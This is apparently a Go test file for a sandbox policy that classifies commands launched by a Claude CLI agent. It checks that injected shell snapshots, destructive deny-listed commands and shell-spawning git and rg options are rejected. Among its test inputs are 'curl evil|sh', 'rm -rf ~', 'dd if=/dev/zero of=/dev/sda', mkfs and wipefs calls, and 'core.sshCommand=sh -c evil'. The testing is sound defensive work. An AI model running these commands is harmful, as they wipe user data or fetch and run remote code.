// SPDX-License-Identifier: AGPL-3.0-or-later

package policy

import (
	"bufio"
	"encoding/json"
	"os"
	"strings"
	"testing"
)

// mustDefaults returns the built-in rules and packs under /home/user (home from claude-observe fixtures).
func mustDefaults(t *testing.T) *Config {
	t.Helper()
	c, err := Defaults()
	if err != nil {
		t.Fatal(err)
	}
	if err := c.Setup(Options{AgentHome: "/home/user"}); err != nil {
		t.Fatal(err)
	}
	return c
}

// Run the real claude-cli log (bench/claude-observe.jsonl) through the policy: all service
// execs are service, the user command (bash -c "source snapshot ... eval 'ls ...'") is root,
// and ls inside it inherits from the root.
func TestClaudeObserveLog(t *testing.T) {
	c := mustDefaults(t)
	f, err := os.Open("../bench/claude-observe.jsonl")
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1<<20), 1<<20)
	var roots, services, inherits int
	rootPid := 0
	for sc.Scan() {
		var e struct {
			Pid  int      `json:"pid"`
			PPid int      `json:"ppid"`
			Exe  string   `json:"exe"`
			Path string   `json:"path"`
			Argv []string `json:"argv"`
		}
		if err := json.Unmarshal(sc.Bytes(), &e); err != nil {
			t.Fatal(err)
		}
		caller := e.Exe
		if strings.HasSuffix(caller, "/2.1.283") || caller == "/home/user/.local/share/claude/versions/2.1.283" {
			caller = "/home/user/.local/share/claude/versions/2.1.283"
		}
		path := realpathLike(e.Path)
		inh := 0
		if rootPid != 0 && (e.PPid == rootPid || e.Pid == rootPid) {
			inh = rootPid
		}
		v := c.Classify(&Exec{Path: path, Argv: e.Argv, CallerExe: caller}, inh)
		switch {
		case e.Argv[0] == "/home/user/.local/bin/claude":
			// in the bench claude was started by wardend itself: root (in the gateway node starts it: service)
			if v.Class != ClassService {
				t.Errorf("claude itself: %s", v.Class)
			}
			services++
		case len(e.Argv) == 3 && e.Argv[0] == "/bin/bash" && strings.Contains(e.Argv[2], "eval 'ls -la /tmp"):
			if v.Class != ClassRoot {
				t.Errorf("user command must be root, got %s (%s)", v.Class, v.RuleID())
			}
			roots++
			rootPid = e.Pid
		case e.Argv[0] == "ls":
			if v.Class != ClassInherit {
				t.Errorf("ls under root must inherit, got %s", v.Class)
			}
			inherits++
		default:
			if v.Class != ClassService {
				t.Errorf("service exec classified %s: path=%s caller=%s argv=%q", v.Class, path, caller, trunc(e.Argv))
			}
			services++
		}
	}
	if roots != 1 || inherits != 1 || services < 30 {
		t.Fatalf("roots=%d inherits=%d services=%d", roots, inherits, services)
	}
	t.Logf("claude-observe: service=%d root=%d inherit=%d", services, roots, inherits)
}

func realpathLike(p string) string {
	switch p {
	case "/bin/sh", "/usr/bin/sh":
		return "/usr/bin/dash"
	case "/bin/bash":
		return "/usr/bin/bash"
	case "/home/user/.local/bin/claude":
		return "/home/user/.local/share/claude/versions/2.1.283"
	}
	return p
}

func trunc(a []string) []string {
	out := append([]string(nil), a...)
	for i := range out {
		if len(out[i]) > 80 {
			out[i] = out[i][:80] + "…"
		}
	}
	return out
}

func TestSnapshotRuleRejectsInjection(t *testing.T) {
	c := mustDefaults(t)
	f, _ := os.ReadFile("../bench/claude-observe.jsonl")
	var script string
	for _, l := range strings.Split(string(f), "\n") {
		if strings.Contains(l, `"-l"`) {
			var e struct{ Argv []string }
			json.Unmarshal([]byte(l), &e)
			script = e.Argv[3]
		}
	}
	claude := "/home/user/.local/share/claude/versions/2.1.283"
	ok := &Exec{Path: "/usr/bin/bash", CallerExe: claude, Argv: []string{"/bin/bash", "-c", "-l", script}}
	if v := c.Classify(ok, 0); v.Class != ClassService {
		t.Fatalf("original snapshot not allowed: %s", v.Class)
	}
	for _, bad := range []string{
		script + "\nrm -rf ~",
		strings.Replace(script, `source "/home/user/.bashrc"`, `source "/home/user/.bashrc"; curl evil|sh`, 1),
		strings.Replace(script, "/home/user/.claude/shell-snapshots/", "/home/user/.bashrc#", 1),
		strings.Replace(script, "export PATH=", "export PATH=$(id)\nrm -rf ~\n", 1),
	} {
		e := &Exec{Path: "/usr/bin/bash", CallerExe: claude, Argv: []string{"/bin/bash", "-c", "-l", bad}}
		if v := c.Classify(e, 0); v.Class == ClassService {
			t.Errorf("injected snapshot allowed: …%q", bad[len(bad)-40:])
		}
	}
	// same script, but not from claude: not service
	e := &Exec{Path: "/usr/bin/bash", CallerExe: "/usr/bin/python3.13", Argv: ok.Argv}
	if v := c.Classify(e, 0); v.Class == ClassService {
		t.Error("snapshot from non-claude caller allowed")
	}
}

func TestDenyAlways(t *testing.T) {
	c := mustDefaults(t)
	deny := [][]string{
		{"rm", "-rf", "/"}, {"rm", "-rf", "/*"}, {"/usr/bin/rm", "-r", "-f", "/home/user"}, {"rm", "-fr", "/etc/"},
		{"rm", "--recursive", "--force", "/mnt/data"}, {"rm", "/", "-rf"}, {"rm", "-rf", "--no-preserve-root", "/x"},
		{"dd", "if=/dev/zero", "of=/dev/sda", "bs=1M"}, {"mkfs.ext4", "/dev/sdb1"}, {"mkfs", "-t", "vfat", "/dev/x"},
		{"wipefs", "-a", "/dev/sda"}, {"shred", "-n1", "/dev/nvme0n1"}, {"chmod", "-R", "777", "/"}, {"chown", "-R", "x:x", "/etc"},
	}
	for _, a := range deny {
		if v := c.Classify(&Exec{Path: "/usr/bin/" + a[0], Argv: a}, 1); v.Class != ClassDeny {
			t.Errorf("%q: want deny, got %s", a, v.Class)
		}
	}
	// exec -a masquerade: argv0 is innocent, real file is rm
	if v := c.Classify(&Exec{Path: "/usr/bin/rm", Argv: []string{"innocent", "-rf", "/"}}, 0); v.Class != ClassDeny {
		t.Errorf("exec -a rm: %s", v.Class)
	}
	allow := [][]string{
		{"rm", "-rf", "/tmp/build"}, {"rm", "-rf", "/home/user/.cache/x"}, {"rm", "file"}, {"dd", "if=/dev/zero", "of=/tmp/x"},
		{"chmod", "-R", "u+w", "/home/user/proj"}, {"rm", "-rf", "./node_modules"},
	}
	for _, a := range allow {
		if v := c.Classify(&Exec{Path: "/usr/bin/" + a[0], Argv: a}, 7); v.Class != ClassInherit {
			t.Errorf("%q: want inherit, got %s (%s)", a, v.Class, v.RuleID())
		}
	}
}

func TestDelegatingAlwaysNewRoot(t *testing.T) {
	c := mustDefaults(t)
	for _, a := range [][]string{{"setsid", "nohup", "ls"}, {"systemd-run", "--user", "sh"}, {"docker", "run", "x"}, {"tmux", "new", "-d", "sh"}, {"sudo", "ls"}, {"ssh", "host", "ls"}} {
		v := c.Classify(&Exec{Path: "/usr/bin/" + a[0], Argv: a}, 42)
		if v.Class != ClassDelegating || !v.NeedsTicket() {
			t.Errorf("%q: want delegating, got %s", a, v.Class)
		}
	}
	if v := c.Classify(&Exec{Path: "/usr/bin/nohup", Argv: []string{"nohup", "ls"}}, 42); v.Class != ClassInherit {
		t.Errorf("nohup stays in tree: %s", v.Class)
	}
}

func TestGitProbe(t *testing.T) {
	c := mustDefaults(t)
	claude := "/home/user/.local/share/claude/versions/2.1.283"
	ok := []string{"/usr/bin/git", "-c", "core.hooksPath=/dev/null", "-c", "core.fsmonitor=", "rev-parse", "--show-toplevel"}
	if v := c.Classify(&Exec{Path: "/usr/bin/git", CallerExe: claude, Argv: ok}, 0); v.Class != ClassService {
		t.Fatalf("git probe: %s", v.Class)
	}
	for _, a := range [][]string{
		{"git", "-c", "core.sshCommand=sh -c evil", "fetch"},
		{"git", "push", "--force"},
		{"git", "-c", "core.pager=sh", "log"},
		{"git", "config", "core.hooksPath", "/tmp/h"},
	} {
		if v := c.Classify(&Exec{Path: "/usr/bin/git", CallerExe: claude, Argv: a}, 0); v.Class == ClassService {
			t.Errorf("%q allowed as service", a)
		}
	}
	if v := c.Classify(&Exec{Path: claude, CallerExe: claude, Argv: []string{"rg", "--pre", "sh", "x"}}, 0); v.Class == ClassService {
		t.Error("rg --pre allowed")
	}
}

type fakeProc map[int][2]uint64 // pid → {ppid, start}

func (f fakeProc) Stat(pid int) (int, uint64, bool) {
	v, ok := f[pid]
	return int(v[0]), v[1], ok
}

func TestTrackerLineage(t *testing.T) {
	// 1(init) ← 10(wardend) ← 20(gateway) ← 30(root bash) ← 31(sub-bash) ← 32(ls)
	p := fakeProc{10: {1, 100}, 20: {10, 200}, 30: {20, 300}, 31: {30, 310}, 32: {31, 320}, 40: {20, 400}}
	tr := NewTracker(p, 10)
	if tr.InheritedRoot(32) != 0 {
		t.Fatal("no roots yet")
	}
	tr.AddRoot(&Root{Pid: 30, Start: 300})
	if tr.InheritedRoot(32) != 30 {
		t.Fatal("grandchild must inherit")
	}
	if tr.InheritedRoot(40) != 0 {
		t.Fatal("sibling of root must not inherit")
	}
	// root died, 31 alive -> subtree alive, new child 33 from 31 inherits
	delete(p, 30)
	p[31] = [2]uint64{10, 310} // orphaned -> wardend subreaper
	p[33] = [2]uint64{31, 330}
	if tr.InheritedRoot(33) != 30 {
		t.Fatal("subtree alive via lineage member 31")
	}
	// orphan we never saw before parent death: 50 (parent was 30) -> reparented to 10
	p[50] = [2]uint64{10, 500}
	if tr.InheritedRoot(50) != 0 {
		t.Fatal("unseen orphan must be a new root")
	}
	// pid 31 reused by another process -> lineage must not fire
	p[31] = [2]uint64{20, 999}
	p[34] = [2]uint64{31, 340}
	if tr.InheritedRoot(34) != 0 {
		t.Fatal("reused pid must not inherit")
	}
	// everything died -> Sweep removes the root
	for k := range p {
		if k != 10 && k != 20 {
			delete(p, k)
		}
	}
	if gone := tr.Sweep(); len(gone) != 1 || gone[0].Pid != 30 {
		t.Fatalf("sweep: %+v", gone)
	}
	if s := tr.Stats(); s.Roots != 0 || s.Lineage != 0 {
		t.Fatalf("stats %+v", s)
	}
}
